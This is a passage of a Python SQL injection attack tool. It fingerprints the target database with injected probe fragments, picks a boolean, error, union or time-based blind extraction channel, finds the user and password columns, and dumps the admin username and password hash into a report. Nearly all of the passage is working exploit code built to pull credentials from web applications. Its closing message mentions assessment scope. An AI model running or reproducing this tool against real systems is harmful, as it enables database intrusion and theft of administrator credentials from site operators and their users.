        "postgresql": " AND CAST((1) AS integer) ",
        "mssql": " AND CONVERT(int, (SELECT TOP 1 name FROM sys.objects)) ",
    }
    hits = []
    for name, frag in probes.items():
        r = t.send(t.wrap(frag + COMMENT))
        if r is None:
            continue
        text = r.text.lower()
        if any(k in text for k in ("mysql", "mariadb")):
            hits.append("mysql")
        if any(k in text for k in ("postgresql", "libpq", "pg_")):
            hits.append("postgresql")
        if any(k in text for k in ("sql server", "microsoft ole db",
                                   "unclosed quotation", "sys.objects")):
            hits.append("mssql")
    hits = sorted(set(hits))
    if len(hits) == 1:
        t.d = Dialect(hits[0])
        ok(f"backend looks like {hits[0]}")
    elif len(hits) > 1:
        t.d = Dialect("mysql")
        bad(f"ambiguous fingerprint {hits}; defaulting to mysql "
            "- re-run with --dbms to be sure")
    else:
        ok("no DB errors exposed; using the --dbms default "
           f"({t.d.name}) - errors are suppressed here, which is itself "
           "the reason the in-band channels below will fail")
    print(f"  dialect in use: {t.d.name}")


def main() -> int:
    args = build_parser().parse_args()
    t = Target(args)

    hr("CONFIGURATION")
    for k in ("url", "param", "method", "type", "dbms", "table", "admin",
              "timeout", "sleep", "dry_run"):
        print(f"  {k:<10}: {getattr(args, k)}")
    print(f"  {'data':<10}: {args.data}")
    print(f"  {'value':<10}: {t.base_value!r}")

    if args.dry_run:
        print("\n  DRY RUN - no requests will be sent\n")

    if not calibrate(t):
        return 2
    if args.dbms == "auto":
        autodetect_dbms(t)

    boolean = detect_boolean(t)
    error = detect_error(t)
    union = None

    if not boolean and not error and not args.dry_run:
        ncols = count_columns(t)
        if ncols:
            slot = map_reflected(t, ncols)
            if slot is not None:
                union = UnionOracle(t, ncols, slot)

    primary = union or error or boolean
    oracle = None

    if primary is not None:
        oracle = primary
    else:
        info("no in-band channel available - using time-based blind")
        time_o = detect_time(t)
        if time_o is None:
            bad("no usable channel. If the parameter is genuinely "
                "vulnerable this usually means an intermediary is "
                "filtering; try --dbms, --type, or a different --param.")
            return 1
        oracle = time_o
        t.findings.append(Finding(
            "fallback", "Fell back to time-based blind extraction",
            f"{time_o.requests} requests, ~{args.sleep}s each",
        ))

    hr("CHANNEL SELECTION")
    print(f"  boolean : {'available' if boolean else 'no'}")
    print(f"  error   : {'available' if error else 'no'}")
    print(f"  union   : {'available' if union else 'no'}")
    print(f"  time    : {'available' if oracle is time_o else 'not needed'}"
          if 'time_o' in dir() else "  time    : not evaluated")
    print(f"  using   : {oracle.channel}")

    cols = []
    if not args.no_discover and oracle.channel in ("boolean", "error", "union"):
        if oracle.channel == "time":
            info("column discovery via the time channel is prohibitively "
                 f"slow; using the supplied names "
                 f"({args.user_col}, {args.pass_col})")
        else:
            cols = discover_columns(oracle, t)
    if not cols:
        cols = [args.user_col, args.pass_col]

    creds = extract(oracle, t, cols)

    hr("REPORT")
    if not t.findings:
        bad("no SQL injection confirmed. The parameter appears to be "
            "parameterised or the payloads are being filtered.")
        return 1
    for f in t.findings:
        print(f"\n  [{f.channel.upper()}] {f.title}")
        if f.payload:
            print(f"    payload : {f.payload}")
        print(f"    evidence: {f.evidence}")
    print(f"\n  total requests sent: {t.requests_made}")
    print(f"  oracle requests    : {oracle.requests}")

    if creds:
        print(f"\n  {'=' * 60}")
        print(f"  ADMIN CREDENTIALS (via {creds['via']})")
        print(f"  {'=' * 60}")
        print(f"  username     : {creds['username']}")
        print(f"  password hash: {creds['password_hash']}")
        print(f"  algorithm    : {creds['algo']}")

    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            json.dump({
                "url": args.url, "param": args.param, "dbms": t.d.name,
                "requests": t.requests_made,
                "findings": [{"channel": f.channel, "title": f.title,
                              "evidence": f.evidence, "payload": f.payload,
                              "detail": f.detail} for f in t.findings],
                "credentials": creds,
            }, fh, indent=2)
        ok(f"report written to {args.out}")

    print("\n  Report this finding and stop. Crack the hash offline; do not "
          "reuse these credentials outside the assessment scope.\n")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit("\ninterrupted")
